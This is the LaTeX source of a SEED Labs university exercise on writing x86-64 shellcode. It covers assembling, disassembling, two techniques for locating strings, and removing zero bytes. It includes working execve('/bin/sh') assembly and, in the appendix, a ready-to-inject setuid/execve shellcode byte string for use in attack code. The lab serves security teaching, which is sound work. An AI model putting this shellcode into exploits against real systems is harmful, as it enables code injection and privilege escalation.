%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}
\usepackage{hyperref}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}

% Arrows
\newcommand{\pointleft}[1]{\reflectbox{\ding{217}} \textbf{\texttt{#1}}}
\newcommand{\pointright}[1]{\ding{217} \textbf{\texttt{#1}}}
\newcommand{\pointupleft}[1]{\reflectbox{\ding{218}} \textbf{\texttt{#1}}}

% Line numbers
\newcommand{\lineone}{\ding{192}\xspace}
\newcommand{\linetwo}{\ding{193}\xspace}
\newcommand{\linethree}{\ding{194}\xspace}
\newcommand{\linefour}{\ding{195}\xspace}
\newcommand{\linefive}{\ding{196}\xspace}
\newcommand{\linesix}{\ding{197}\xspace}
\newcommand{\lineseven}{\ding{198}\xspace}
\newcommand{\lineeight}{\ding{199}\xspace}
\newcommand{\linenine}{\ding{200}\xspace}


% Fancy headers
\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

\newcommand{\seedisbook}{\textit{Internet Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

\newcommand{\seedcsbook}{\textit{Computer Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

\newcommand{\seedcibook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.\xspace}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.\xspace}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website.\xspace}

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website.\xspace}

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website.\xspace}

\newcommand{\seedenvironmentC}{This lab has been tested on the SEED
Ubuntu 20.04 VM. You can download a pre-built image from the SEED website, 
and run the SEED VM on your own computer. However,
most of the SEED labs can be conducted on the cloud, and 
you can follow our instruction to create a SEED VM on the cloud.\xspace}

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website.\xspace}

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend much on the SEED VM. You can do this lab
using other VMs, physical machines, or VMs on the cloud.\xspace}

\newcommand{\adddns}{You do need to add the required IP address mapping to
the \texttt{/etc/hosts} file.\xspace}






\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}






\newcommand{\gdb}{\texttt{gdb}\xspace} 

\lhead{\bfseries SEED Labs -- Shellcode Development Lab}


\begin{document}

\begin{center}
{\LARGE Shellcode Development Lab}
\end{center}

\seedlabcopyright{2020}



% *******************************************
% SECTION
% ******************************************* 
\section{Overview}

Shellcode is widely used in many attacks that involve 
code injection. Writing shellcode is quite challenging. Although
we can easily find existing shellcode from the Internet, 
there are situations where we have to write a shellcode that 
satisfies certain specific requirements. Moreover, 
to be able to write our own shellcode from scratch is 
always exciting. 
There are several interesting 
techniques involved in shellcode. 
The purpose of 
this lab is to help students understand these techniques 
so they can write their own shellcode.  


There are several challenges in writing shellcode, one is to 
ensure that there is no zero in the binary, and the other is to find 
out the address of the data used in the command. 
The first challenge is not very difficult to solve, and there
are several ways to solve it. The solutions to the 
second challenge led to two typical approaches to 
write shellcode. In one approach, data are pushed 
into the stack during the execution, so their addresses 
can be obtained from the stack pointer. 
In the second approach, data are stored in the code 
region, right after a \texttt{call} instruction. 
When the \texttt{call} instruction is executed, 
the address of the data is treated as the return address,
and is pushed into the stack. 
Both solutions are quite elegant, 
and we hope students can learn these two techniques. 
This lab covers the following topics:

\begin{itemize}[noitemsep]
\item Shellcode
\item Assembly code
\item Disassembling 
\end{itemize}


\paragraph{Readings and videos.}
Detailed coverage of the shellcode can be found in the following:

\begin{itemize}
\item Chapter 9 of the SEED Book, \seedbook
\item Section 4 of the SEED Lecture (Lecture 30), \seedcsvideo
\end{itemize}


\paragraph{Lab environment.} \seedenvironmentC





% *******************************************
% SECTION
% *******************************************
\section{Task 1: Writing Assembly Code} 

To be able to have a direct control over what instructions
to use in a shellcode, the best way to write a shellcode
is to use an assembly language. In this task, we will use 
a sample program to get familiar with the development
environment. 

Assembly languages are different for different computer architectures. 
In this task, the sample code (\texttt{hello.s})  
is for the amd64 (64-bit) architecture. The code is included in
the \texttt{Labsetup} folder. Students working on Apple silicon
machines can find the arm version of the sample code in
the \texttt{Labsetup/arm} folder.  


\begin{lstlisting}[caption={A sample amd64 assembly program (\texttt{hello.s})}]
global _start

section .text

_start:
  mov rdi, 1        ; the standard output
  mov rsi, msg      ; address of the message
  mov rdx, 15       ; length of the message
  mov rax, 1        ; the number of the write() system call
  syscall           ; invoke write(1, msg, 15)

  mov rdi, 0        ;
  mov rax, 60       ; the number for the exit() system call
  syscall           ; invoke exit(0)

section .rodata
  msg: db "Hello, world!", 10
\end{lstlisting}
 
 

\paragraph{Compiling to object code.}
We compile the assembly code above using \texttt{nasm}, which 
is an assembler and disassembler for the Intel x86 and x64 architectures.
For the arm64 architecture, the corresponding tool is called \texttt{as}.  
The \texttt{-f elf64} option indicates that we want to compile the code
to 64-bit ELF binary format. The Executable and Linkable Format (ELF) 
is a common standard file format for executable file, object code, shared libraries. 
For 32-bit assembly code, \texttt{elf32} should be used. 

\begin{lstlisting}
// For amd64
$ nasm -f elf64 hello.s -o hello.o  

// For arm64
$ as  -o hello.o hello.s 
\end{lstlisting}

\paragraph{Linking to generate final binary.}
Once we get the object code \texttt{hello.o}, if we want to generate the 
executable binary, we can run the linker program \texttt{ld}, which
is the last step in compilation. 
After this step, we get the final
executable code \texttt{hello}.
If we run it, it will print out \texttt{"Hello, world!"}.  

\begin{lstlisting}
// For both amd64 and arm64
$ ld hello.o -o hello
$ ./hello  
Hello, world!
\end{lstlisting}



\paragraph{Getting the machine code.}
In most attacks, we only need the machine code 
of the shellcode, not a standalone executable file, which
contains data other than the actual machine code. 
Technically, only the machine code is called shellcode. 
Therefore, we need to extract the machine
code from the executable file or the object file.
There are various ways to do that. One way is to 
use the \texttt{objdump} command to disassemble the 
executable or object file. 

For amd64, there are two different common syntax modes for assembly code, 
one is the AT\&T syntax mode, and the other is 
Intel syntax mode. By default, \texttt{objdump} uses
the AT\&T mode. In the following, 
we use the \texttt{-Mintel} option to 
produce the assembly code in the Intel mode. 

\begin{lstlisting}
$ objdump -Mintel -d hello.o
hello.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <_start>:
   0:	bf 01 00 00 00       	mov    edi,0x1
   5:	48 be 00 00 00 00 00 	movabs rsi,0x0
   c:	00 00 00 
   f:	ba 0f 00 00 00       	mov    edx,0xf
  14:	b8 01 00 00 00       	mov    eax,0x1
  19:	0f 05                	syscall 
  1b:	bf 00 00 00 00       	mov    edi,0x0
  20:	b8 3c 00 00 00       	mov    eax,0x3c
  25:	0f 05                	syscall 
\end{lstlisting}
 
In the above printout, the numbers after the colons
are machine code. 
You can also use the \texttt{xxd} command to print out 
the content of the binary file, and you should be 
able to find out the shellcode's machine
code from the printout.

\begin{lstlisting}
$ xxd -p -c 20 hello.o
7f454c4602010100000000000000000001003e00
...
000000001800000000000000(*@\textbf{bf0100000048be00}@*)
(*@\textbf{00000000000000ba0f000000b8010000000f05bf}@*)
(*@\textbf{00000000b83c0000000f05}@*)000000000000000000
...
\end{lstlisting}
 


\paragraph{Task.} Your task is to go through the entire process:
compiling and running the sample code, and then get the 
machine code from the binary. 



% *******************************************
% SECTION
% *******************************************
\section{Task 2: Writing Shellcode (Approach 1)} 

The main purpose of shellcode is to actually quite simple:
to run a shell program such as \texttt{/bin/sh}.
In the Ubuntu operating system, this can be achieved 
by invoking the \texttt{execve()} system call.

\begin{lstlisting}
execve("/bin/sh", argv[], 0)
\end{lstlisting}

We need to pass three arguments to this system call:
In the amd64 architecture, they are
passed through the \texttt{rdi}, \texttt{rsi},
and \texttt{rdx} registers.  
In the arm64 architecture, they are
passed through the \texttt{x0}, \texttt{x1}, 
and \texttt{x2} registers. 
The pseudo-code is listed below: 

\begin{lstlisting}
// For amd64 architecture
 Let rdi = address of the "/bin/sh" string
 Let rsi = address of the argv[] array
 Let rdx = 0

 Let rax = 59    // 59 is execve's system call number
 syscall         // Invoke execve()

// For the arm64 architecture
 Let x0  = address of the "/bin/sh" string
 Let x1  = address of the argv[] array
 Let x2  = 0

 Let x8 =  221   // 221 is execve's system call number
 svc 0x1337      // Invoke execve()
\end{lstlisting}


The main challenge of writing a shellcode is how to get the address 
of the \texttt{"/bin/sh"} string and the address of 
the \texttt{argv[]} array? They are two typical approaches:


\begin{itemize}
\item Approach 1: Store the string and the array in the code segment, 
  and then get their addresses using the PC register, which points to the
  code segment. We focus on this approach in this task. 

\item Approach 2: Dynamically construct the string and the 
  array on the stack, and then use the stack pointer register 
  to get their addresses. We focus on this approach in the next task.
\end{itemize}
 

% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Task 2.a. Understand the code} 

We provide a sample shellcode below. This code is for the amd64 
architecture. The code can also be found in the \texttt{Labsetup} folder. 
If you are working on this lab on an Apple silicon machine, you can
find the sample arm64 code in the \texttt{arm} sub-folder.

\begin{lstlisting}[caption=A sample 64-bit shellcode (\texttt{mysh64.s})] 
section .text
  global _start
    _start:
       BITS 64
       jmp short two
    one:
       pop rbx             
       
       mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
       mov rax, 0x00      ; rax = 0
       mov [rbx+16], rax  ; store rax to memory at address rbx + 16
       
       mov rdi, rbx       ; rdi = rbx        (*@\lineone@*) 
       lea rsi, [rbx+8]   ; rsi = rbx +8     (*@\linetwo@*)  
       mov rdx, 0x00      ; rdx = 0
       mov rax, 59        ; rax = 59
       syscall
    two:
       call one                                                                   
       db '/bin/sh', 0 ; The command string (terminated by a zero)  (*@\linethree@*) 
       db 'AAAAAAAA'   ; Place holder for argv[0] 
       db 'BBBBBBBB'   ; Place holder for argv[1]
\end{lstlisting}

The code above first jumps to the instruction at 
location \texttt{two}, which does another 
jump (to location \texttt{one}), but this time,
it uses the \texttt{call} instruction.  This instruction 
is for function call, i.e., before it jumps to
the target location, it saves the address
of the next instruction (i.e., the return address) 
on the top of the stack, so when
the function returns, it can return to the 
instruction right after the \texttt{call} instruction.  

In this example, the ``instruction'' right after the 
\texttt{call} instruction is not actually an instruction; 
it stores a string. However, this does not matter, the
\texttt{call} instruction will push its address (i.e.,
the string's address) into the stack, in the return
address field of the function frame. When we 
get into the function, i.e., after jumping to 
location \texttt{one}, the top of the stack 
is where the return address is stored. Therefore,
the \texttt{pop rbx} instruction actually
get the address of the string on Line \linethree,
and save it to the \texttt{rbx} register. That is how the 
address of the string is obtained. 


 

\paragraph{Tasks.} Please do the following tasks:

\begin{enumerate}
\item Compile and run the code, and see whether you can
get a shell. The \texttt{-g} option enables the debugging 
information, as we will debug the code.  

\begin{lstlisting}
// For amd64
$ nasm -g -f elf64 -o mysh64.o mysh64.s 
$ ld --omagic -o mysh64 mysh64.o 

// For arm64
$ as  -g -o mysh64.o mysh64.s
$ ld --omagic -o mysh64 mysh64.o
\end{lstlisting}


\textbf{Note.} We need to use the \texttt{--omagic} option when running the
linker program \texttt{ld}. 
By default, the code segment is not writable.
When this program runs, it needs to modify the data stored
in the code region; if the code segment is not
writable, the program will crash.
This is not a problem for actual attacks, because
in attacks, the code is typically injected into a writable data
segment (e.g. stack or heap). Usually we do not run shellcode
as a standalone program.



\item Use \gdb to debug the program, and show how the program
gets the address of the shell string \texttt{/bin/sh}.  

\item Explain how the program constructs the 
\texttt{argv[]} array, and show which lines set the values
for \texttt{argv[0]} and \texttt{argv[1]}, respectively.   

\item Explain the real meaning of Lines~\lineone and~\linetwo. 
\end{enumerate}
 


\paragraph{Common \texttt{gdb} commands.} 
Here are some \gdb commands that may be useful to this lab. 
To know how to use other \gdb commands, 
inside \gdb, you can type \texttt{help} to get 
a list of command class names. Type \texttt{help} followed 
by a class name, and you can get a list of commands in that class.


\begin{lstlisting}
$ gdb mysh64

help          -- Print out the help information
break one     -- Set a break point at section "one"
run           -- Start debugged program.
step          -- Step program until it reaches a different source line.
print  $rbx   -- Print out the value of the rbx register
x/40bx <addr> -- Print out 40 bytes of memory at address <addr>
x/40bx $rsp   -- Print out the top 40 bytes of the stack
x/5gx  $rsp   -- Print out the top 5 double-word (8 bytes) of the stack
quit          -- Exit from gdb 
\end{lstlisting}


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2.b. Eliminate zeros from the code}

Shellcode is widely used in buffer-overflow attacks. In many 
cases, the vulnerabilities are caused by string copy, such
as the \texttt{strcpy()} function. For these string copy functions,
zero is considered as the end of the string. Therefore, if we have 
a zero in the middle of a shellcode, string copy will not be able to
copy anything after the zero, 
so the attack will not be able to succeed. 
Although not all the vulnerabilities have issues with zeros, 
it becomes a requirement for shellcode not to have any zero in
the machine code; otherwise, the application of a shellcode 
will be limited. 

The sample code provided in the previous section is 
not a true shellcode, because it contains several zeros.
Please use the \texttt{objdump} command to get the machine
code of the shellcode and mark all the instructions 
that have zeros in the machine code. 

To eliminate these zeros, you need to rewrite the 
shellcode \texttt{mysh64.s}, replacing the problematic 
instructions with an alternative. 
Section~\ref{sec:zero} provides some approaches that 
you can use to get rid of zeros. Please show
the revised \texttt{mysh64.s} and explain how you
get rid of each single zero from the code. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2.c. Run a more complicated command}
 
Inside \texttt{mysh64.s}, 
we construct the \texttt{argv[]} array for the 
\texttt{execve()} system call. Since 
our command is \texttt{/bin/sh}, without any command-line
arguments, our \texttt{argv} array only contains 
two elements: the first one is a pointer to 
the command string, and the second one is zero. 

In this task, we need to run the 
following command, i.e., we want to use 
\texttt{execve} to execute the following command, which
uses \texttt{/bin/bash} to execute the \texttt{"echo hello; ls -la"}
command. 

\begin{lstlisting}
/bin/bash -c "echo hello; ls -la"
\end{lstlisting}

In this new command, the \texttt{argv} array should have 
the following four elements, all of which need to be 
constructed inside the shellcode. Please modify \texttt{mysh64.s} and 
demonstrate your execution result. As usual, you cannot have 
any zero in your shellcode.

\begin{lstlisting}
argv[0] = address of the "/bin/bash" string
argv[1] = address of the "-c" string
argv[2] = address of the command string "echo hello; ls -la"
argv[3] = 0
\end{lstlisting}
 

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2.d. Pass environment variables}

The third parameter for the \texttt{execve()} system call
is a pointer to the environment variable array, and it allows 
us to pass environment variables to the program. In our 
sample program, we pass a null pointer to \texttt{execve()}, so
no environment variable is passed to the program. 
In this task, we will pass some environment variables. 

If we change the command \texttt{"/bin/sh"} in our shellcode
\texttt{mysh64.s} to \texttt{"/usr/bin/env"}, which is a command to print out the 
environment variables. You can find out that when we run
our shellcode, there will be no output, because our 
process does not have any environment variable.

In this task, we will write a shellcode called \texttt{myenv64.s}. When this 
program is executed, it executes the \texttt{"/usr/bin/env"} command, which
can print out the following environment variables: 

\begin{lstlisting}
$ ./myenv64
aaa=hello
bbb=world
ccc=hello world
\end{lstlisting}

To write such a shellcode, we need to construct an
environment variable array on the stack, 
and store the address of this array to the \texttt{rdx} register,  
before invoking \texttt{execve()}.  
The way to construct this array is exactly the same
as the way how we construct the \texttt{argv[]} array. 
See the following: 

\begin{lstlisting}
env[0] = address to the "aaa=hello"  string
env[1] = address to the "bbb=world"  string
env[2] = address to the "ccc=hello world"  string
env[3] = 0   // 0 marks the end of the array
\end{lstlisting}




% *******************************************
% SECTION
% *******************************************
\section{Task 3: Writing Shellcode (Approach 2)} 

Another approach to get the shell string and the \texttt{argv[]}
array is to dynamically construct them on the stack,
and then use the stack pointer register to get their addresses. 
A sample shellcode (for amd64) using this approach is listed below. Both
amd64 and arm64 code can be found from the \texttt{Labsetup} folder.  

Brief explanation of the code is given in the comment, but if students
want to see a full explanation, they can find much more detailed explanation
of the code in the SEED book.

\begin{lstlisting}[caption={Shellcode using the stack approach (\texttt{another\_sh64.s})}]
section .text
global _start
  _start:
    xor  rdx, rdx       ; rdx = 0
    push rdx            ; push 0 into the stack (terminate the string below)
    mov rax,'/bin//sh'  
    push rax            ; push the string into the stack
    mov rdi, rsp        ; rdi = address of the command string

    push rdx            ; push argv[1]=0 into stack
    push rdi            ; push argv[0] into stack
    mov rsi, rsp        ; rsi = address of the argv[] array

    xor  rax, rax
    mov  al, 59         ; execve()
    syscall
\end{lstlisting}

We can use the following commands to compile the assemble code into
64-bit binary code: 

\begin{lstlisting}
// For amd64
$ nasm -f elf64 mysh_64.s -o mysh_64.o
$ ld mysh_64.o -o mysh_64

// For arm64
$ as mysh_64.s -o mysh_64.o
$ ld mysh_64.o -o mysh_64
\end{lstlisting}


\paragraph{Task 3.a.}
The code example shows how to execute \texttt{"/bin/sh"}.
In this task, we need to revise the shellcode, so it can 
execute a more complicated shell command listed in the 
following. 
Please write your code to achieve this. 
You need to show that there is no zero in your code. 

\begin{lstlisting}
/bin/bash -c "echo hello; ls -la"
\end{lstlisting}


\paragraph{Task 3.b.}
Please compare the two approaches in this lab. Which
one do you like better, and why? 


% *******************************************
% SECTION
% *******************************************
\section{Guidelines: Getting Rid of Zeros}
\label{sec:zero}

There are many techniques that can get rid of zeros
from the shellcode. In this section, we discuss some of the 
common techniques that you may find useful for this lab. 
Although the common ideas are the same for both amd64 and arm64
architectures, the instructions are different. 
In this section, we use amd64 instructions as examples. 
Students can working on Apple silicon machines can 
find the guidelines from this online 
document:
\href{https://github.com/seed-labs/seed-labs/blob/master/category-software/Shellcode/arm/shellcode_arm64.md}{Writing ARM64 shellcode (in Ubuntu)}. 


\begin{itemize}
\item If we want to assign zero to \texttt{rax}, we 
can use \texttt{"mov rax, 0"}, but doing so,
we will get zeros in the machine code. 
A typical way to solve this problem is to 
use \texttt{"xor rax, rax"}, i.e., we xor
\texttt{rax} with itself, the result is zero,
which is saved to \texttt{rax}. 

\item If we want to store \texttt{0x99} to
\texttt{rax}. We cannot just use \texttt{"mov rax, 0x99"}, because 
the second operand is expanded to 8 bytes, i.e., \texttt{0x0000000000000099}, 
which contains seven zeros. 
To solve this problem, we can first set \texttt{rax} to zero, and then
assign a one-byte number \texttt{0x99} to the \texttt{al} register, which 
represent the least significant 8 bits of the \texttt{eax} register. 

\begin{lstlisting}
xor rax, rax
mov al,  0x99
\end{lstlisting}
 

\item Another way is to use shift. 
Again, let us store \texttt{0x99} to \texttt{rax}.
We first store \texttt{0xFFFFFFFFFFFF99} to \texttt{rax}.
Second, we shift this register to the left for 56 bits; 
now \texttt{rax} contains \texttt{0x9900000000000000}.  
Then we shift the register to the right for 56 bits;
the most significant 56 bits (7 bytes) will be filled with \texttt{0x00}. 
After that, \texttt{rax} will contain \texttt{0x00000000000099}. 

\begin{lstlisting}
mov  rax, 0xFFFFFFFFFFFFFF99
shl  rax, 56
shr  rax, 56
\end{lstlisting}


\item Strings need to be terminated by zero, but if we define a string
using the first line of the following, we will have a zero in the code. 
To solve this problem, we define a string using the second line, i.e.,
putting a non-zero byte (\texttt{0xFF}) at the end of the string first.  

\begin{lstlisting}
db 'abcdef', 0x00 
db 'abcdef', 0xFF 
\end{lstlisting}
 
After getting the address of the string, we can dynamically change
the non-zero byte to \texttt{0x00}. Assuming 
that we have saved the address of the string to \texttt{rbx}.
We also know the length of the string (excluding the zero) is 6; 
Therefore, we can use the following instructions to 
replace the \texttt{0xFF} with \texttt{0x00}.   

\begin{lstlisting}
xor al, al
mov [rbx+6], al
\end{lstlisting}
 
\end{itemize}







% *******************************************
% SECTION
% *******************************************
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% *******************************************
% SECTION
% *******************************************
\appendix
\section{Using the shellcode in attacking code}

In actual attacks, we need to include the shellcode
in our attacking code, such as a Python or C program.
We usually store the machine code in an array, but
converting the machine code printed above 
to the array assignment in Python and C programs
is quite tedious if done manually, especially if 
we need to perform this process many times in the lab. 
We wrote the following Python code to
help this process. Just copy whatever you
get from the \texttt{xxd} command (only the shellcode part)
and paste it to the following code, between the lines
marked by \texttt{"""}. The code can be downloaded from the 
lab's website.


\begin{lstlisting}[caption=\texttt{convert.py}] 
#!/usr/bin/env python3

# Run "xxd -p -c 20 mysh.o", and
# copy and paste the machine code part to the following:
ori_sh ="""
31db31c0b0d5cd80
31c050682f2f7368682f62696e89e3505389e131
d231c0b00bcd80
"""

sh = ori_sh.replace("\n", "")

length  = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = 'shellcode= (\n' + '   "'
for i in range(length):
    s += "\\x" + sh[2*i] + sh[2*i+1]
    if i > 0 and i % 16 == 15:
       s += '"\n' + '   "'
s += '"\n' + ").encode('latin-1')"
print(s)
\end{lstlisting}
 
The \texttt{convert.py} program will print out the 
following Python code that you can include 
in your attack code. It stores the shellcode in
a Python array. 
 
\begin{lstlisting}
$ ./convert.py
Length of the shellcode: 35
shellcode= (
   "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
   "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
   "\x0b\xcd\x80"
).encode('latin-1')
\end{lstlisting}


\end{document}







